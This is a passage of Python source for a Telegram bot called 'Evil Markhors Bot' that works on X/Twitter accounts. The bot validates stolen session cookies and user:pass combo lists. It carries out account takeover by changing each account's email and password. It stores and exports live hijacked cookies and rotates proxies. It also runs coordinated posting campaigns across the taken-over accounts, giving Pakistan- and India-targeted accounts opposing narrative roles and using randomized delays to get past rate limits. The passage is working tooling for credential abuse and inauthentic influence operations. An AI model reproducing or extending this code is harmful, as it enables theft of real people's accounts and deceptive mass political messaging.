    if size > ZIP_UPLOAD_MAX:
        raise RuntimeError("zip bahut bara hai (" + str(size // 1048576)
                           + " MB) - chhote batches mein todo")
    with open(path, "rb") as f:
        data = f.read()
    f = InputFile(io.BytesIO(data), filename=filename)
    cap = (caption or "")[:1000]
    chat = getattr(u, "effective_chat", None)
    msg = _ctx_msg(u)
    # callback flow mein u.message None hota hai, isliye chat/effective use karo
    if chat is not None:
        await chat.send_document(f, caption=cap)
    elif msg is not None:
        await msg.reply_document(f, caption=cap)
    else:
        raise RuntimeError("chat nahi mila")


CMD_PAGES = [
 ("1. Basics", (
  "/start\nIntro aur mode list.\n\n"
  "/rework\nAlt cookie format rework with branding. [plus] [2fa false] [email].txt format support.\n\n"
  "/help\nChhota format guide.\n\n"
  "/commands [page]\nYehi list, page number se: /commands 6. Buttons bhi hain.\n\n"
  "/status\nAapki settings: mode, live, takeover, newpass, newemail, store, batch, pending, split, campaign.\n\n"
  "/diag\nSystem info: python, lib version, DB on/off, table, reverify hours, live, store, last net error, admin. Support se pehle yehi bhejo.\n\n"
  "/netcheck\nAdmin. X direct + har proxy + Supabase ka reachability test, saath verdict.")),
 ("2. Settings", (
  "/mode auto|cookies|ulp|verify\nFile mode force. auto = content se detect.\n\n"
  "/live on|off\nCookie rework pe live check. OFF = koi API call nahi, sirf parse.\n\n"
  "/takeover on|off\nULP login ke baad email alias + password change.\n\n"
  "/newpass <p>\nTakeover password. Khaali = random.\n\n"
  "/newemail you@gmail.com\nTakeover base email, alias khud banta hai.\n\n"
  "/store ask|file|both|db\nCookie file pe kya karein: ask = poochho, file = sirf zip, both = zip+DB, db = sirf DB.")),
 ("3. Cookie file", (
  "Cookie zip ya .txt chat mein bhejo, mode auto khud samajh lega.\n\n"
  "Flow: download > /store ask ho to 3 buttons > rework + verify > live counter > zip.\n\n"
  "Har account ka field block banta hai: Status, Username, ID, Followers, Friends, Posts, Likes, Media, "
  "Verified, Protected, Country, Year, Email + cookie lines.\n\n"
  "Dead bhi file mein rehta hai (Status: DEAD). DB mein sirf LIVE jaata hai.\n"
  "Limit MAX_FILES = 5000 per file.")),
 ("4. Verify / Split / Extract", (
  "/verify\nMode verify. Phir zip bhejo: working/ + dead/ + unknown/ + summary.txt.\n"
  "unknown = net/server error, dead nahi â€” dobara verify karo.\n\n"
  "/split <field> <buckets>\nAdmin. /split followers 0-100,100-500,1000+\n"
  "/split country PK,IN\n/split year 2010-2015,2016-2020\n"
  "Output: split_<bucket>/ + unmatched/ + summary.txt.\n\n"
  "/splitoff\nSplit band.\n\n"
  "/extract country PK,IN\n/extract year 2014-2021\n/extract go\n"
  "Admin. Filter ke mutabiq accounts nikaalo: filtered/ + excluded/.")),
 ("5. ULP login", (
  "Line: user:pass | email:pass | user:email:pass | ...:TOTP\nPassword mein ':' ho to bhi theek.\n\n"
  "TOTP khud bharta hai. Code maanga jaye to bot username list bhejta hai, aap bhejo: username code.\n\n"
  "/finalize\nPending chhod ke zip banao.\n\n/cancel\nBatch clear.\n\n"
  "Output: results.txt, success.txt, failed.txt.")),
 ("6. Campaign banao", (
  "Admin.\n/camp new <name>\n/camp role PK|IN|OTHER (PK = appreciation, IN = loss, OTHER = breaking)\n"
  "/camp text â€” phir messages = variants\n/camp auto on|off|ALL â€” built-in pool\n"
  "/camp media â€” photo/video pool\n/camp mediaclear\n/camp tag #Tag\n"
  "/camp parts 1-6\n/camp delay 45-110\n/camp cleanup on|off\n"
  "/camp preview â€” sample posts\n/camp dry â€” bina post test\n/camp status\n/camp reset")),
 ("7. Campaign chalao", (
  "Admin.\n/camp filter country PK,IN\n/camp filter year 2014-2021\n/camp filter followers 500\n"
  "/camp filter protected on\n/camp filter clear\n/camp limit 500\n"
  "/camp source zip|db\n/camp nopost 7 (db source)\n/camp start\n/stopcamp\n/report\n\n"
  "/report = last campaign ka summary (zip campaign khatam pe aati hai).\n"
  "Report: per-role links, failed list class ke saath, retry/ folder, batch id se /delbatch camp<id>.")),
 ("8. Database", (
  "Admin. SUPABASE_URL/KEY chahiye.\n/db stats\ntotal / live / dead.\n"
  "/db reverify\nManual pass.\n/db purge\nDead rows delete.\n"
  "/db export\nWorking accounts zip.\n/db export country PK,IN\n/db clear yes\n\n"
  "Auto reverify har REVERIFY_HOURS chalta hai: live = refresh, dead = fails+1, "
  "DEAD_AFTER pe delete.")),
 ("9. Simple tweet", (
  "Admin, purana halka version.\n/tweet [country]\nPhir texts + photo/video.\n/tweetgo\nPhir cookie zip.\n"
  "/tweetcancel\n\nHar account pe random variant, prefix/suffix, hashtag shuffle, thread chain.")),
 ("10. Cleanup / admin", (
  "/delbatches\nSaved batches.\n/delbatch <id>\nTweets delete.\n/broadcast <text>\nSab users ko.\n"
  "/countrytest\nEk cookie .txt - status + reason + country + username batata hai (suspend check ke liye).\n\n"
  "/proxy\nProxy status (masked).\n/proxy test\nHar proxy check (ok/fail + ms).\n"
  "/proxy add [auto|socks5|http] host:port:user:pass\nAdd + volume par save (IPv6 bhi). auto = type detect.\n"
  "/proxy detect host:port:user:pass\nSOCKS5 vs HTTP khud check karo.\n"
  "/proxy clear\nRuntime proxies hatao.\n"
  "/proxy list\nMasked list.\n/proxy reload\nPROXY_FILE dobara padho.\n/proxy off|on\nIs run ke liye proxy band/chalu (deploy ke baghair test).\n\n"
  "/netcheck\nX direct + proxies + Supabase, ek hi jagah.\n\n"
  "Admin: /split /splitoff /extract /camp /stopcamp /db /delbatches /delbatch /broadcast /countrytest /proxy /netcheck")),
 ("11. Errors", (
  "Jawab nahi de raha > /diag + Railway logs.\n"
  "DB off > SUPABASE_URL/KEY check, redeploy.\n"
  "File atki > /cancel, dobara bhejo.\n"
  "Purana batch > 60s wait ya /cancel.\n"
  "Sab DEAD > cookie export purana hai.\n"
  "429 flood > /camp delay 90-180, limit kam.\n"
  "Country detect nahi > /countrytest.\n\n"
  "Logs: Railway > service > Deployments > View Logs.")),
]


def _cmd_kb(n):
    row = []
    if n > 0:
        row.append(InlineKeyboardButton("â—€", callback_data="cmdp:%d" % (n - 1)))
    row.append(InlineKeyboardButton("%d/%d" % (n + 1, len(CMD_PAGES)), callback_data="cmdp:%d" % n))
    if n < len(CMD_PAGES) - 1:
        row.append(InlineKeyboardButton("â–¶", callback_data="cmdp:%d" % (n + 1)))
    return InlineKeyboardMarkup([row])


async def _send_cmd_page(msg, n, edit):
    title, body = CMD_PAGES[n]
    txt = "COMMANDS  (" + str(n + 1) + "/" + str(len(CMD_PAGES)) + ")\n" + title + "\n\n" + body
    if edit is not None:
        await edit.edit_text(txt, reply_markup=_cmd_kb(n))
    else:
        await msg.reply_text(txt, reply_markup=_cmd_kb(n))


async def commands_cmd(u, c):
    n = 0
    if c.args:
        try:
            n = int(c.args[0]) - 1
        except Exception:
            n = 0
    await _send_cmd_page(u.message, max(0, min(n, len(CMD_PAGES) - 1)), None)


async def on_cmd_cb(u, c):
    q = u.callback_query
    await q.answer()
    try:
        n = int(q.data.split(":", 1)[1])
    except Exception:
        n = 0
    try:
        await _send_cmd_page(None, max(0, min(n, len(CMD_PAGES) - 1)), q.message)
    except BadRequest as e:
        if "not modified" not in str(e).lower():
            logging.warning("cmd page: %s", e)


async def start(u, c):
    await u.message.reply_text(
        "Evil Markhors Bot\n\nModes:\n1) COOKIES rework\n2) ULP login + takeover\n3) VERIFY\n\n"
        "/mode /live /takeover /newpass /newemail /store /status /diag /netcheck /finalize /cancel /rework\n"
        "Admin: /camp /db /split /extract /broadcast /countrytest /delbatches\n\n"
        "Poori command list: /commands")


async def help_cmd(u, c):
    await u.message.reply_text(
        "ULP: user:pass | email:pass | ...:2fa â€” code aaye to 'username code'\n"
        "VERIFY: /verify > zip\nSTORE: /store ask|file|both|db\n"
        "CAMPAIGN: /camp new > /camp text > /camp filter > /camp start\n"
        "EXTRACT: /extract country PK,IN year 2015-2020\n\nSab kuch: /commands")


async def store_cmd(u, c):
    a = c.args[0].lower() if c.args else ""
    if a not in ("ask", "file", "both", "db"):
        await u.message.reply_text(
            "Store mode: " + get_store_mode(u.effective_user.id) + "\n"
            "ask = poochho | file = sirf zip | both = zip+DB | db = sirf DB\n"
            + ("" if db_enabled() else "DB off hai.\n"))
        return
    await set_cfg(u.effective_user.id, store=a)
    await u.message.reply_text("Store = " + a + ("" if db_enabled() else " (DB missing)"))


async def status_cmd(u, c):
    uid = str(u.effective_user.id)
    g = ucfg(uid)
    txt = ("Mode: " + g["mode"] + "\nLive: " + ("ON" if g["live"] else "OFF")
           + "\nTakeover: " + ("ON" if g["takeover"] else "OFF")
           + "\nNewPass: " + (g["newpass"] or "(random)")
           + "\nNewEmail: " + (g["newemail"] or "(none)")
           + "\nStore: " + get_store_mode(uid)
           + "\nBatch: " + ("chal raha" if uid in BATCH else "none")
           + " | Pending: " + str(len(PEND.get(uid, {}))))
    cc = CAMPS.get(uid)
    if cc:
        txt += ("\nCAMP: " + (cc.get("name") or "-")
                + " | src " + str(cc.get("source") or "-"))
    kind = job_running(uid)
    if kind:
        txt += "\nJob: " + kind
    await u.message.reply_text(txt)


async def diag_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    import platform
    import telegram
    uid = str(u.effective_user.id)
    px = (str(len(PROXIES)) + " | " + proxy_mode()) if PROXIES else "OFF"
    await u.message.reply_text(
        "py " + platform.python_version() + " | ptb " + telegram.__version__ + "\n"
        "db " + ("ON" if db_enabled() else "OFF") + " | table " + DB_TABLE + "\n"
        "reverify " + str(REVERIFY_HOURS) + "h | batch " + str(REVERIFY_BATCH)
        + " | dead_after " + str(DEAD_AFTER) + "\n"
        "live " + ("ON" if ucfg(uid)["live"] else "OFF")
        + " | store " + get_store_mode(uid) + "\n"
        "proxy " + px + "\n"
        "last net: " + net_last_text() + "\n"
        + ("proxy hint: " + PROXY_HINT + "\n" if PROXY_HINT else "")
        + "admin " + str(is_admin(u.effective_user.id)))


async def proxy_cmd(u, c):
    global PROXY_DISABLED
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    a = c.args[0].lower() if c.args else ""
    if a in ("off", "on"):
        PROXY_DISABLED = (a == "off")
        X_ROUTE.update({"at": 0, "ok": None, "why": ""})
        if a == "off":
            await u.message.reply_text(
                "Proxy OFF (is run ke liye). X traffic direct jayega.\n"
                "/netcheck se direct test karo, wapas ON: /proxy on")
        else:
            load_proxies()
            await u.message.reply_text("Proxy ON\n" + proxy_status_text())
        return
    if a == "detect":
        entries = [x for x in re.split(r"[\s,]+", " ".join(c.args[1:])) if x]
        if not entries:
            await u.message.reply_text(
                "Use: /proxy detect 45.144.31.82:PORT:USER:PASS\n"
                "SOCKS5 aur HTTP dono try karega (format dono ka same hai).")
            return
        use = entries[:10]
        msg = await u.message.reply_text(
            "Detect (" + str(len(use)) + ")... SOCKS5 + HTTP try, "
            "har entry 40s tak le sakti hai.")
        lines = []
        for e in use:
            lines.append(mask_entry(e))
            res = await detect_proxy(e)
            good = [r for r in res if r.get("ok")]
            for r in res:
                if r.get("ok"):
                    lines.append("  " + r["scheme"] + ": OK "
                                 + str(r.get("code") or "") + " "
                                 + str(r.get("ms", 0)) + "ms")
                else:
                    lines.append("  " + r["scheme"] + ": fail "
                                 + str(r.get("why") or "?")[:70])
            if len(good) == 1:
                lines.append("  => type: " + good[0]["scheme"])
            elif good:
                lines.append("  => dono chal rahe hain ("
                             + ", ".join(r["scheme"] for r in good) + ")")
            else:
                reasons = " ".join((r.get("why") or "") for r in res)
                if any(b in reasons for b in
                       ("502", "503", "504", "Host unreachable",
                        "Connection refused")):
                    lines.append("  => proxy zinda hai, lekin X blocked "
                                 "(provider side) - dusra proxy/location lo")
                else:
                    lines.append("  => koi protocol kaam nahi kiya "
                                 "(host/port/creds check karo)")
        if len(entries) > len(use):
            lines.append("+ " + str(len(entries) - len(use))
                         + " skipped (max 10)")
        await _edit(msg, "\n".join(lines[:80]))
        return
    if a in ("add", "set"):
        rest = list(c.args[1:])
        kind = ""
        if rest and rest[0].lower() in PROXY_SCHEMES + ("socks", "auto"):
            kind = rest[0].lower()
            if kind == "socks":
                kind = "socks5"
            rest = rest[1:]
        entries = [x for x in re.split(r"[\s,]+", " ".join(rest)) if x]
        if not entries:
            await u.message.reply_text(
                "Use:\n"
                "/proxy add socks5 45.144.31.82:PORT:USER:PASS\n"
                "/proxy add auto 45.144.31.82:PORT:USER:PASS  (detect type)\n"
                "/proxy add socks5://USER:PASS@45.144.31.82:PORT\n"
                "/proxy add socks5 [2001:db8::1]:PORT:USER:PASS\n"
                "(type chhodo to PROXY_TYPE/default http lagega)")
            return
        good, bad = [], []
        if kind == "auto":
            use = entries[:10]
            msg = await u.message.reply_text(
                "Detect (" + str(len(use)) + ")... SOCKS5 + HTTP try...")
            dlines = []
            for e in use:
                res = await detect_proxy(e)
                ok = [r for r in res if r.get("ok")]
                dlines.append(mask_entry(e) + " -> "
                              + (ok[0]["scheme"] if ok else "fail"))
                if ok:
                    good.append(ok[0]["proxy"])
                else:
                    bad.append(e)
            if len(entries) > len(use):
                dlines.append("+ " + str(len(entries) - len(use))
                              + " skipped (max 10)")
            await _edit(msg, "\n".join(dlines))
        else:
            for e in entries:
                n = norm_proxy(e, kind or None)
                if n:
                    good.append(n)
                else:
                    bad.append(e)
        if good:
            cur = runtime_proxy_lines()
            seen = set(cur) | set(PROXIES)
            for g in good:
                if g not in seen:
                    cur.append(g)
                    seen.add(g)
            if save_runtime_proxy_lines(cur):
                load_proxies()
                X_ROUTE.update({"at": 0, "ok": None, "why": ""})
            else:
                bad += good
                good = []
        txt = "Proxy add: " + str(len(good)) + " ok"
        if bad:
            txt += " | " + str(len(bad)) + " invalid"
        txt += "\n" + proxy_status_text()
        if bad:
            txt += "\ninvalid: " + ", ".join(x[:60] for x in bad[:5])
        if good:
            txt += "\n\nAb /proxy test chalao."
        await u.message.reply_text(txt)
        return
    if a in ("clear", "reset", "del", "remove"):
        had = bool(runtime_proxy_lines())
        try:
            os.remove(RUNTIME_PROXY_FILE)
        except FileNotFoundError:
            pass
        except Exception:
            logging.exception("runtime proxies clear")
        load_proxies()
        X_ROUTE.update({"at": 0, "ok": None, "why": ""})
        await u.message.reply_text(
            ("Runtime proxies clear ho gaye." if had else
             "Runtime file mein kuch nahi tha.") + "\n" + proxy_status_text())
        return
    if a == "reload":
        n = len(load_proxies())
        X_ROUTE.update({"at": 0, "ok": None, "why": ""})
        await u.message.reply_text("Proxy reload: " + str(n) + " configured\n"
                                   + proxy_status_text())
        return
    if a == "list":
        await u.message.reply_text(proxy_status_text())
        return
    if a == "test":
        if not PROXIES:
            await u.message.reply_text(proxy_status_text())
            return
        msg = await u.message.reply_text("Proxy test (" + str(len(PROXIES)) + ")...")
        res = await pmap(probe_proxy, PROXIES, 4)
        good = [r for r in res if r and r["ok"]]
        lines = []
        for r in res:
            if not r:
                lines.append("? failed")
                continue
            lines.append(mask_proxy(r["proxy"]) + " | "
                         + ("ok" if r["ok"] else "fail")
                         + (" " + str(r["code"]) if r.get("code") else "")
                         + (" " + r["why"] if r.get("why") else "")
                         + " " + str(r["ms"]) + "ms")
        await _edit(msg, "Proxy test: ok " + str(len(good)) + "/" + str(len(PROXIES))
                    + "\n" + "\n".join(lines[:40]) + _proxy_tips(res))
        return
    await u.message.reply_text(
        proxy_status_text()
        + "\n\n/proxy test - har proxy check\n/proxy list - masked list"
          "\n/proxy detect <entry> - SOCKS5 vs HTTP khud check karo"
          "\n/proxy add [auto|type] host:port:user:pass - add + save (volume)"
          "\n/proxy clear - runtime proxies hatao"
          "\n/proxy reload - PROXY_FILE dobara padho"
          "\n/proxy off|on - is run ke liye proxy band/chalu")


async def netcheck_one(label, url, headers=None, proxy=None, want_json=False):
    t0 = time.time()
    kw = {"timeout": httpx.Timeout(15.0), "follow_redirects": False,
          "trust_env": False}
    if proxy:
        kw["proxy"] = proxy
    try:
        async with httpx.AsyncClient(**kw) as cl:
            r = await cl.get(url, headers=headers or {"User-Agent": UA})
    except Exception as e:
        why = type(e).__name__
        detail = " ".join(str(e).split())[:40]
        if detail:
            why += ": " + detail
        net_note(label + " " + why)
        return label + ": FAIL " + why, False, 0
    ms = int((time.time() - t0) * 1000)
    txt = label + ": HTTP " + str(r.status_code) + " " + str(ms) + "ms"
    ok = True
    if want_json:
        try:
            r.json()
        except Exception:
            ok = False
            txt += " (non-json/block)"
    return txt, ok, r.status_code


async def netcheck_report(proxy_limit=10):
    lines = []
    x_url = PROXY_TEST_URL
    line, direct_ok, _ = await netcheck_one("X direct", x_url, want_json=True)
    lines.append(line)
    proxy_ok = 0
    proxy_fail = 0
    use_proxy = bool(PROXIES) and not PROXY_DISABLED
    if use_proxy:
        res = await pmap(probe_proxy, PROXIES[:proxy_limit], 4)
        for r in res:
            if not r:
                proxy_fail += 1
                lines.append("proxy ?: FAIL")
                continue
            if r["ok"]:
                proxy_ok += 1
            else:
                proxy_fail += 1
            lines.append("proxy " + mask_proxy(r["proxy"]) + ": "
                         + ("HTTP " + str(r.get("code")) if r.get("ok")
                            else "FAIL " + str(r.get("why") or "?"))
                         + " " + str(r.get("ms", 0)) + "ms")
    else:
        lines.append("proxy: OFF (direct hi use ho raha hai)"
                     if not PROXIES else "proxy: OFF (/proxy off)")
    if db_enabled():
        sline, _, db_code = await netcheck_one(
            "Supabase", db_url() + "?select=username&limit=1", db_headers())
        lines.append(sline)
        db_ok = 0 < db_code < 400
    else:
        db_ok = False
        lines.append("Supabase: OFF")
    if use_proxy and proxy_ok and proxy_fail:
        verdict = "Kuch proxies fail hain - sirf working wale rakho."
    elif use_proxy and not proxy_ok:
        whys = " ".join((r.get("why") or "") for r in res if r)
        verdict = "Sab proxies X tak nahi pohanch rahe."
        if ("502" in whys or "503" in whys or "504" in whys
                or "Host unreachable" in whys or "Connection refused" in whys):
            verdict += ("\nProxy alive hai lekin X target reject ho raha hai "
                        "(provider-side block). Dusra location/proxy lo jahan "
                        "X allowed ho - bot/code ka masla nahi hai.")
        elif "ProtocolError" in whys or "Malformed reply" in whys:
            verdict += ("\nProtocolError = protocol mismatch: is port par SOCKS5 "
                        "nahi hai. /proxy detect <entry> chalao (HTTP bhi try "
                        "karega), ya panel se HTTP list lo.")
        elif "404" in whys or "307" in whys:
            verdict += ("\n404/307 = ye proxy endpoint nahi, panel/subscription URL hai."
                        "\nProvider ka host:port:user:pass /proxy add socks5 ... se daalo, "
                        "ya xray/sing-box se socks5://127.0.0.1:1080 banao.")
        elif "Timeout" in whys:
            verdict += ("\nTimeout = proxy handshake atak raha hai; port/protocol "
                        "galat ya proxy down. /proxy detect <entry> try karo.")
        else:
            verdict += ("\nPath-auth/vless link httpx proxy nahi hai; "
                        "http://user:pass@host:port ya socks5 chahiye.")
        if PROXY_HINT:
            verdict += ("\nPath wali link mili thi (" + ", ".join(sorted(PROXY_HINT)[:2])
                        + "): path strip ho jata hai, isliye auth fail hota hai.")
    elif use_proxy and proxy_ok and not direct_ok:
        verdict = "Proxy theek hai, direct block hai - proxy ON rakho."
    elif not use_proxy and direct_ok:
        verdict = "Direct X reachable. Agar verify phir bhi unknown ho to cookies/403 dekho."
    elif not use_proxy and not direct_ok:
        verdict = "Railway se X tak network/DNS fail. Proxy lagao."
    else:
        verdict = "X reachable."
    if not db_ok and db_enabled():
        verdict += "\nSupabase fail - URL/key/table check karo."
    return ("NETCHECK\n" + "\n".join(lines)
            + "\n\n" + verdict + "\n\nLast error: " + net_last_text())


async def netcheck_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    msg = await u.message.reply_text("Netcheck...")
    await _edit(msg, await netcheck_report(10))


async def startup_netcheck(app):
    """Deploy ke baad ek dafa X/proxy/Supabase reachability check."""
    await asyncio.sleep(20)
    try:
        txt = await netcheck_report(3)
    except Exception:
        logging.exception("startup_netcheck")
        return
    logging.warning("startup %s", txt.replace("\n", " | "))
    for aid in ADMIN_IDS:
        try:
            await app.bot.send_message(aid, txt)
        except Exception:
            logging.warning("netcheck alert fail %s", aid)


async def mode_cmd(u, c):
    a = c.args[0].lower() if c.args else "auto"
    a = a if a in ("auto", "cookies", "ulp", "verify") else "auto"
    await set_cfg(u.effective_user.id, mode=a)
    await u.message.reply_text("Mode = " + a)


async def verify_cmd(u, c):
    await set_cfg(u.effective_user.id, mode="verify")
    await u.message.reply_text("Mode = verify. Ab cookie zip bhejo.")


async def rework_cmd(u, c):
    """Alternative format cookie rework with branding."""
    await set_cfg(u.effective_user.id, mode="rework")
    await u.message.reply_text(
        "Mode = rework. Ab cookie .txt bhejo.\n"
        "Supported formats:\n"
        "[plus] [2fa false] [email].txt\n"
        "[free] [2fa true] [email].txt\n"
        "[Free] [email].txt\n"
        "free data @email .txt\n\n"
        "Output: branded zip with standard format.")


async def live_cmd(u, c):
    uid = u.effective_user.id
    a = c.args[0].lower() if c.args else ""
    new = True if a in ("on", "1", "yes") else False if a in ("off", "0", "no") else not get_live(uid)
    await set_cfg(uid, live=new)
    await u.message.reply_text("Live = " + ("ON" if new else "OFF"))


async def takeover_cmd(u, c):
    uid = u.effective_user.id
    a = c.args[0].lower() if c.args else ""
    new = True if a in ("on", "1", "yes") else False if a in ("off", "0", "no") else not ucfg(uid)["takeover"]
    await set_cfg(uid, takeover=new)
    await u.message.reply_text("Takeover = " + ("ON" if new else "OFF"))


async def newpass_cmd(u, c):
    await set_cfg(u.effective_user.id, newpass=(" ".join(c.args) if c.args else ""))
    await u.message.reply_text("NewPass = " + (ucfg(u.effective_user.id)["newpass"] or "(random)"))


async def newemail_cmd(u, c):
    await set_cfg(u.effective_user.id, newemail=(c.args[0] if c.args else ""))
    await u.message.reply_text("NewEmail = " + (ucfg(u.effective_user.id)["newemail"] or "(none)"))


async def split_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not c.args:
        cfg = SPLIT.get(uid)
        await u.message.reply_text("Split: " + (cfg["field"] + " | "
                                   + ", ".join(l for l, a, b, d in cfg["buckets"]) if cfg else
                                   "set nahi.\nFields: " + ", ".join(KEYMAP)))
        return
    field = c.args[0].lower()
    if field not in KEYMAP or len(c.args) < 2:
        await u.message.reply_text("Field + buckets do. Fields: " + ", ".join(KEYMAP))
        return
    buckets = parse_buckets(" ".join(c.args[1:]))
    if not buckets:
        await u.message.reply_text("Buckets samajh nahi aaye.")
        return
    SPLIT[uid] = {"field": field, "buckets": buckets}
    await u.message.reply_text("Split set: " + field + "\nAb zip bhejo.")


async def splitoff_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    SPLIT.pop(str(u.effective_user.id), None)
    await u.message.reply_text("Split off.")


async def extract_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    cfg = EXTRACT.setdefault(uid, {"filter": {"countries": [], "years": []}, "stage": "idle"})
    a = [x.lower() for x in c.args]
    if not a:
        f = cfg["filter"]
        await u.message.reply_text("country " + (",".join(f["countries"]) or "ALL") + " | year "
                                   + (",".join(str(x[0]) + "-" + str(x[1]) for x in f["years"]) or "ALL")
                                   + "\n\n/extract country PK,IN | year 2014-2021 | clear | go")
        return
    if a[0] == "clear":
        EXTRACT[uid] = {"filter": {"countries": [], "years": []}, "stage": "idle"}
        await u.message.reply_text("Clear.")
    elif a[0] == "country" and len(c.args) > 1:
        cfg["filter"]["countries"] = [to_iso(x) or x.upper()
                                      for x in " ".join(c.args[1:]).split(",") if x.strip()]
        await u.message.reply_text("Country = " + ",".join(cfg["filter"]["countries"]))
    elif a[0] == "year" and len(c.args) > 1:
        cfg["filter"]["years"] = parse_years(" ".join(c.args[1:]))
        await u.message.reply_text("Year = " + str(cfg["filter"]["years"]))
    elif a[0] == "go":
        cfg["stage"] = "await"
        await u.message.reply_text("Ab zip bhejo.")
    else:
        await u.message.reply_text("Samajh nahi aaya. /extract dekho.")


async def run_extract(u, doc):
    uid = str(u.effective_user.id)
    cfg = EXTRACT.get(uid)
    if not cfg:
        await u.message.reply_text("Extract set nahi. /extract country PK year 2015-2020")
        return
    tmp = tempfile.mkdtemp(prefix="ext_")
    ip, op = os.path.join(tmp, "in.zip"), os.path.join(tmp, "out.zip")
    msg = await u.message.reply_text("Download...")
    try:
        f = await doc.get_file()
        await f.download_to_drive(ip)
        prog = Progress(msg, 0, "EXTRACT")
        prog.phase = "Filtering"
        await process_extract(ip, op, cfg, get_live(uid), prog)
        await _send_zip(u, op, "evilmarkhors_extract.zip",
                        "Extract | filtered " + str(prog.ok) + " | excluded " + str(prog.fail))
        await _edit(msg, "Complete")
    except Exception as e:
        logging.exception("extract")
        await _edit(msg, "Error: " + str(e))
    finally:
        if EXTRACT.get(uid):
            EXTRACT[uid]["stage"] = "idle"
        shutil.rmtree(tmp, ignore_errors=True)


async def db_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not db_enabled():
        await u.message.reply_text("SUPABASE_URL / KEY set nahi.")
        return
    a = [x.lower() for x in c.args]
    sub = a[0] if a else "stats"
    async with http_client(use_proxy=False) as client:
        if sub == "stats":
            await u.message.reply_text(
                "DB pool\ntotal " + str(await db_count(client)) + "\nlive "
                + str(await db_count(client, "live")) + "\ndead "
                + str(await db_count(client, "dead")) + "\nreverify "
                + str(REVERIFY_HOURS) + "h | dead_after " + str(DEAD_AFTER))
        elif sub == "reverify":
            msg = await u.message.reply_text("Reverify...")
            out = await reverify_pass(u.get_bot(), False)
            await _edit(msg, "Reverify: " + json.dumps(out or {"info": "koi due nahi"}))
        elif sub == "purge":
            msg = await u.message.reply_text("Purge...")
            n = await db_delete_where(client, {"status": "eq.dead",
                                               "last_check": "lt." + now_iso(-24)})
            await _edit(msg, "Purged " + str(n))
        elif sub == "export":
            filt = {}
            if len(a) > 2 and a[1] == "country":
                filt["country"] = "in.(" + ",".join(
                    to_iso(x) or x.upper()
                    for x in " ".join(c.args[2:]).split(",") if x) + ")"
            msg = await u.message.reply_text("Export...")
            rows = await db_fetch_all(client, dict(filt, status="eq.live"))
            d = tempfile.mkdtemp(prefix="exp_")
            op = os.path.join(d, "export.zip")
            with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
                for r in rows:
                    data = {"Username": r.get("username"), "ID": r.get("x_id"),
                            "Country": r.get("country"), "Year": r.get("yr"),
                            "Followers": r.get("followers"),
                            "Protected": r.get("protected"),
                            "Verified": r.get("verified"), "Status": "LIVE"}
                    exp = int(time.time()) + 86400 * 300
                    lines = [_cookie_line(".x.com\tTRUE\t/\tTRUE\t" + str(exp)
                                          + "\t" + str(k) + "\t" + str(v))
                             for k, v in (r.get("cookies") or {}).items()]
                    z.writestr((r.get("username") or "acc") + ".txt",
                               build_cookie_file(data, lines))
                z.writestr("summary.txt", "exported: " + str(len(rows)))
            await _send_zip(u, op, "db_export.zip", "Export: " + str(len(rows))
                            + "\nWARNING: zip mein account cookies hain - file"
                            " ko kisi ke saath share na karein.")
            shutil.rmtree(d, ignore_errors=True)
        elif sub == "clear":
            if len(a) > 1 and a[1] == "yes":
                msg = await u.message.reply_text("Clearing...")
                n = await db_clear(client)
                await _edit(msg, "Cleared " + str(n))
            else:
                await u.message.reply_text("/db clear yes")
        else:
            await u.message.reply_text("stats | reverify | purge | export | clear yes")


async def camp_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    a = [x.lower() for x in c.args]
    sub = a[0] if a else ""
    if sub in ("", "status"):
        cfg = CAMPS.get(uid)
        if not cfg:
            await u.message.reply_text("Set nahi.\n/camp new <name> | /camp text | /camp media | "
                                       "/camp filter | /camp preview | /camp start")
            return
        f = cfg["filter"]
        await u.message.reply_text(
            "CAMP " + (cfg["name"] or "-") + " | " + cfg["stage"] + "\ntag " + cfg["tag"]
            + "\nsource " + cfg["source"] + " | role " + cfg["role"]
            + "\nauto " + json.dumps(cfg["auto"]) + "\ncustom PK " + str(len(cfg["roles"]["PK"]))
            + " IN " + str(len(cfg["roles"]["IN"])) + " OTHER " + str(len(cfg["roles"]["OTHER"]))
            + "\nmedia " + str(len(cfg["media"])) + "\nfilter " + (",".join(f["countries"]) or "ALL")
            + " | " + (",".join(str(x[0]) + "-" + str(x[1]) for x in f["years"]) or "ALL")
            + " | minF " + str(f["min_followers"])
            + "\nlimit " + ("ALL" if not cfg["limit"] else str(cfg["limit"]))
            + " | delay " + str(int(cfg["delay"][0])) + "-" + str(int(cfg["delay"][1]))
            + "s | nopost " + str(cfg["nopost"]) + "d | dry " + str(cfg["dry_run"]))
        return
    if sub == "new":
        cfg = new_camp()
        cfg["name"] = (" ".join(c.args[1:]) or "camp")[:40]
        CAMPS[uid] = cfg
        save_camp(uid)
        await u.message.reply_text("Bana: " + cfg["name"] + "\ntag " + DEFAULT_TAG
                                   + "\n/camp text | /camp media | /camp filter | /camp start")
        return
    cfg = CAMPS.get(uid)
    if not cfg:
        await u.message.reply_text("Pehle /camp new <name>.")
        return
    if sub == "text":
        cfg["stage"] = "text"
        save_camp(uid)
        await u.message.reply_text("Role " + cfg["role"] + " â€” variants bhejo. /camp idle se band.")
    elif sub == "idle":
        cfg["stage"] = "idle"
        save_camp(uid)
        await u.message.reply_text("Band.")
    elif sub == "role":
        r = (a[1] if len(a) > 1 else "").upper()
        if r not in ("PK", "IN", "OTHER"):
            await u.message.reply_text("PK | IN | OTHER")
            return
        cfg["role"] = r
        save_camp(uid)
        await u.message.reply_text("Role = " + r)
    elif sub == "auto":
        r = (a[1] if len(a) > 1 else cfg["role"]).upper()
        if r == "ALL":
            v = not all(cfg["auto"].values())
